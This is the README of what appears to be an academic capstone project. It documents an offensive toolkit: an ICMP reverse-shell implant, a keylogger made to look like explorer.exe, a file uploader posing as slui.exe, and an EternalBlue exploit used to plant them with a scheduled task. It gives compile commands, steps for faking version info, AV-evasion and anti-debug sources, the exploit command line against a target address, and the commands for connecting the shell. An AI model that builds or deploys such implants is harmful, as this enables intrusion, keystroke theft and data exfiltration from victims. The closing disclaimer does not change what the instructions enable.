# CS564 - Capstone Project

---

## Requirement

-   Linux host (we used the provided VM of Ubuntu)
    -   Python 2.7
        -   [Installer (python.org)](https://www.python.org/downloads/release/python-2718/)
        -   [Pip installer](https://bootstrap.pypa.io/pip/2.7/get-pip.py)
        -   `impacket`: Run `python2 -m pip install impacket`
-   Windows 7 (for compiling implants)
    -   [Python 3.4.4](https://www.python.org/downloads/release/python-344/)
        -   [PyWin32 221](https://github.com/mhammond/pywin32/releases/tag/b221)
        -   pip==19.1.1
        -   APScheduler==3.3.0
        -   certifi==2018.11.29
        -   cffi==1.15.1
        -   chardet==3.0.4
        -   charset-normalizer==3.1.0
        -   cryptography==2.8
        -   future==0.18.3
        -   idna==2.7
        -   pycparser==2.21
        -   PyInstaller==3.2.1
        -   pyinstaller-hooks-contrib==2022.0
        -   pynput==1.6.8
        -   pytz==2023.3
        -   requests==2.20.1
        -   six==1.16.0
        -   tzdata==2023.3
        -   tzlocal==2.1
        -   urllib3==1.24.3
    -   Visual C++ 2008 compiler.
        -   [Installer (archive.org)](https://web.archive.org/web/20210106040224/https://download.microsoft.com/download/7/9/6/796EF2E4-801B-4FC4-AB28-B59FBF6D907B/VCForPython27.msi)
    -   Visual Studio 2010 (do not use Express version)
        -   Visual C++ 10.0 with MFC
    -   Windows SDK 7.1
    -   [Resource Hacker](http://angusj.com/resourcehacker/) (for faking Version Info)

## Generating payload

We prepare a C2 package that communicates through ICMP protocol.

### Remote shell

To compile remote shell,
open Visual C++ 2008 32-bit Command Prompt, and type the
following. Remember to change `MY_IP` to the IP of commander.

```
cl.exe icmpsh-s.patch.c /D"MY_IP=\"192.168.191.128\""
```

### Keylogger (fileNew.py)

```
pyinstaller --additional-hooks-dir C:\Python34\Lib\site-packages\_pyinstaller_hooks_contrib\hooks\stdhooks --onefile --paths=C:\python34\lib\site-packages --windowed -i "C:\Windows\explorer.exe" fileNew.py
```

#### FileUploader (fileUploader.py)

```
pyinstaller --additional-hooks-dir C:\Python34\Lib\site-packages\_pyinstaller_hooks_contrib\hooks\stdhooks --hidden-import=queue --onefile --paths=C:\python34\lib\site-packages -i "C:\Windows\System32\slui.exe" fileUploader.py
```

Then use Resource Hacker to clone Version Info.

See `output/compiled.zip` for all Python compiled C2 payload.

## List of components when executing in attacker

-   `icmpsh-s.patch.exe` (Remote shell plant)
-   `explorer_32.exe` (Keylogger)
-   `OneDrive.bat` (Keylogger bootstrap)
-   `sluii.exe` (File Uploader)
-   `icmpsh_m3.py` (Remote shell connect)
-   `eBlue.py` (EternalBlue exploit)
-   `mysmb.py` (Necessary for EternalBlue)

## Infiltrate

Inside folder, `eBlue.py` is the exploit. Run

```
python2 eBlue.py 169.254.16.129
```

After running, the C2 package should now be stored inside the target system.
Additionally, a scheduled task is made to execute C2 in the future.

## Exfil

### Remote shell

Due to the protocol limitation, we need to connect using Linux system and
run the following command to disable automatic ICMP reply.

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null
```

When the scheduled task run, in order to connect,
execute on our host:

```
sudo python3 icmpsh_m3.py 169.254.16.130 169.254.16.129
```

### Keylogger

This is executed on startup by `OneDrive.bat`.
Record data is stored in `%TMP%/Install.log`

### FileUploader

This can be executed by running

```
C:\WINDOWS\sluii.exe <file>
```

## Credits

-   `icmpsh-s.patch.c` and `icmpsh-m3.py` is based on [bdamele:icmpsh](https://github.com/bdamele/icmpsh)
-   `eBlue.py` from [Exploit-DB](https://www.exploit-db.com/exploits/42315)
-   Anti-debug techniques from [Anti-Debug Tricks](https://anti-debug.checkpoint.com/)
-   C obfuscation from [scrt:avcleaner](https://github.com/scrt/avcleaner)
-   [Resource Hacker](http://angusj.com/resourcehacker/)

## Disclaimer

Do not use this on systems unless you have been given explicit permission.
This is created for an academic course. We are not responsible for any
consequences both legally and ethically that are caused by the software.